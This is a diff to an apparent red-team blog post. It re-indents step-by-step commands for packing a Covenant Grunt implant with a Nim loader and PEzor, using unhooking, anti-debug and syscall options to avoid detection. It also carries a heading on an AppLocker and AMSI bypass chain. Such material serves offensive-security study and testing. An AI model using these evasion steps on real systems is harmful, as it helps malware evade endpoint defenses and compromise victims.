@@ -123,30 +123,30 @@ My attempts to combine the parts to chain a stealthy attack resulted in two appr
 Just to try to avoid local detection when copied to disk.   
 
 1. Create Grunt.exe  
-![broken]({{ site.baseurl }}/images/2021-16-01/Create_Grunt_exe.png "create Grunt")  
+   ![broken]({{ site.baseurl }}/images/2021-16-01/Create_Grunt_exe.png "create Grunt")  
 
 2. Convert Grunt.exe to Nim byte array  
-```
-CSharpToNimByteArray -inputfile .\GruntHTTP.exe
-```
-![broken]({{ site.baseurl }}/images/2021-16-01/Convert_Grunt_to_array.png "convert to byte array")   
+   ```
+   CSharpToNimByteArray -inputfile .\GruntHTTP.exe
+   ```
+   ![broken]({{ site.baseurl }}/images/2021-16-01/Convert_Grunt_to_array.png "convert to byte array")   
 
-3. Paste the byte array into the C# loader [template](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim) and build the C executable  
-```
-nim c --passL:-Wl,--dynamicbase,--export-all-symbols .\LoadCSharp.nim
-```
+3. Paste the byte array into the C# loader [template](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim) and build the C    executable  
+   ```
+   nim c --passL:-Wl,--dynamicbase,--export-all-symbols .\LoadCSharp.nim
+   ```
 
 4. Wrap the C executable into PEZor  
-```
-PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
-```
-![broken]({{ site.baseurl }}/images/2021-16-01/Building_PEZor.png "PEZor build")  
+   ```
+   PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
+   ```
+   ![broken]({{ site.baseurl }}/images/2021-16-01/Building_PEZor.png "PEZor build")  
 
 5. Deploy  
-![broken]({{ site.baseurl }}/images/2021-16-01/Covenant_PEZor_run.png "PEZor run")  
+   ![broken]({{ site.baseurl }}/images/2021-16-01/Covenant_PEZor_run.png "PEZor run")  
 
-*Tada - Grunt incoming*  
-![broken]({{ site.baseurl }}/images/2021-16-01/Covenant_PEZor_success.png "PEZor success")  
+   *Tada - Grunt incoming*  
+   ![broken]({{ site.baseurl }}/images/2021-16-01/Covenant_PEZor_success.png "PEZor success")  
 
 #### AppLocker & Constrained language bypass -> Powershell load script -> AMSI bypass -> Invoke-SharpLoader -> Encrypted Grunt
 
